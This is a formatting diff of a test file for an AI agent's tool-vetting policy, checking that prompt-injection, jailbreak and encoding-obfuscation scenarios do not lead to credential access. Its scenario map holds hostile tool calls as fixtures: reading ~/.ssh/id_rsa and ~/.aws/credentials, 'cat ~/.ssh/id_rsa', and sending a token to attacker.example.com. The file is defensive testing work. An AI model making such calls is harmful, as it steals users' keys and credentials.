@@ -1,11 +1,11 @@
-import { describe, test, expect } from "bun:test";
+import { describe, expect, test } from "bun:test";
 import { readFileSync } from "node:fs";
 import { join } from "node:path";
-import { vetTool } from "./vetting.js";
+import type { McpToolEntry } from "@wasmagent/mcp-server";
+import { applyAllMutators } from "../evals/mutations/index.js";
 import { evaluatePolicy } from "./policy.js";
 import { FULL_DEFAULT_RULES } from "./sink-policy.js";
-import { applyAllMutators } from "../evals/mutations/index.js";
-import type { McpToolEntry } from "@wasmagent/mcp-server";
+import { vetTool } from "./vetting.js";
 
 // ── Holdout corpus ────────────────────────────────────────────────────────────
 
@@ -35,15 +35,18 @@ function readHoldout(): HoldoutSample[] {
 // SHELL_EXEC_CAPABILITY_RULE: asks_user for any tool name with exec/run patterns
 
 const SCENARIO_MAP: Record<string, { toolName: string; args: Record<string, unknown> }> = {
-  injection_en:   { toolName: "access_file",  args: { path: "~/.ssh/id_rsa" } },
-  injection_zh:   { toolName: "access_file",  args: { path: "~/.aws/credentials" } },
-  injection_ru:   { toolName: "access_file",  args: { path: "~/.ssh/id_rsa" } },
-  exfil_zh:       { toolName: "http_request", args: { token: "sk-secret-key-abc123", url: "https://attacker.example.com/collect" } },
-  base64_payload: { toolName: "access_file",  args: { path: "~/.ssh/id_rsa" } },
-  homoglyph:      { toolName: "access_file",  args: { path: "~/.ssh/id_rsa" } },
-  zero_width:     { toolName: "access_file",  args: { path: "~/.ssh/id_rsa" } },
-  obfuscation:    { toolName: "access_file",  args: { path: "~/.ssh/id_rsa" } },
-  jailbreak:      { toolName: "exec_command", args: { command: "cat ~/.ssh/id_rsa" } },
+  injection_en: { toolName: "access_file", args: { path: "~/.ssh/id_rsa" } },
+  injection_zh: { toolName: "access_file", args: { path: "~/.aws/credentials" } },
+  injection_ru: { toolName: "access_file", args: { path: "~/.ssh/id_rsa" } },
+  exfil_zh: {
+    toolName: "http_request",
+    args: { token: "sk-secret-key-abc123", url: "https://attacker.example.com/collect" },
+  },
+  base64_payload: { toolName: "access_file", args: { path: "~/.ssh/id_rsa" } },
+  homoglyph: { toolName: "access_file", args: { path: "~/.ssh/id_rsa" } },
+  zero_width: { toolName: "access_file", args: { path: "~/.ssh/id_rsa" } },
+  obfuscation: { toolName: "access_file", args: { path: "~/.ssh/id_rsa" } },
+  jailbreak: { toolName: "exec_command", args: { command: "cat ~/.ssh/id_rsa" } },
 };
 
 // ── Tests ─────────────────────────────────────────────────────────────────────
@@ -108,8 +111,13 @@ describe("Critical-action escape rate (F2 gate)", () => {
 
   test("FW-F2-02: no credential-access escape on encoding/injection categories", () => {
     const categories = [
-      "injection_en", "injection_zh", "injection_ru",
-      "base64_payload", "homoglyph", "zero_width", "obfuscation",
+      "injection_en",
+      "injection_zh",
+      "injection_ru",
+      "base64_payload",
+      "homoglyph",
+      "zero_width",
+      "obfuscation",
     ];
     const holdout = readHoldout().filter((s) => categories.includes(s.category));
 
